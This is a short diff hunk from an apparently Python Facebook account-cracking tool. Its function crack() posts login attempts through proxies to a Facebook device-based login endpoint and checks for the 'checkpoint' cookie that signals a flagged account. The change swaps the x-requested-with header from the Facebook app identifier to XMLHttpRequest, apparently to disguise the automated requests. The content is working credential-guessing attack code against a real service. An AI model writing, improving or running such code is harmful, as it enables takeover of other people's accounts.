@@ -659,7 +659,7 @@ def crack(idf,pwx,url,awal):
 				"sec-fetch-dest":"empty",
 				"accept-encoding":"gzip, deflate br",
 				"accept-language":"en-GB,en-US;q=0.9,en;q=0.8",
-				"x-requested-with":"com.facebook.katana",
+				"x-requested-with":"XMLHttpRequest",
 				}
 			bx = ses.post(f'https://{url}/login/device-based/regular/login/?refsrc=deprecated&lwv=100', headers=hd2, data=date, proxies=proxy)
 			if "checkpoint" in ses.cookies.get_dict():
